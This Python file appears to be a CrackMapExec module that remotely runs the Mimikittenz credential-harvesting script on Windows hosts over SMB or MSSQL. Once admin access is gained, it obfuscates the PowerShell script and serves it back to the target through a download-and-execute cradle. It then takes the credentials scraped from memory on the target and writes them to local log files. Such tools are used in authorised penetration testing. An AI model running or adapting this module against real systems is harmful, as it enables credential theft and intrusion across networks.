from cme.helpers.powershell import *
from cme.helpers.logger import write_log
from io import StringIO
from datetime import datetime

class CMEModule:
    '''
        Executes the Mimikittenz script
        Module by @byt3bl33d3r
    '''

    name = 'mimikittenz'
    description = "Executes Mimikittenz"
    supported_protocols = ['mssql', 'smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''
        self.ps_script = obfs_ps_script('mimikittenz/Invoke-mimikittenz.ps1')
        return

    def on_admin_login(self, context, connection):
        command = 'Invoke-mimikittenz'
        launcher = gen_ps_iex_cradle(context, 'Invoke-mimikittenz.ps1', command)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-mimikittenz.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            #with open(get_ps_script('mimikittenz/Invoke-mimikittenz.ps1'), 'r') as ps_script:
            #    ps_script = obfs_ps_script(ps_script.read(), function_name=self.obfs_name)
            request.wfile.write(self.ps_script.encode())

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode()

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)

            log_name = 'MimiKittenz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))
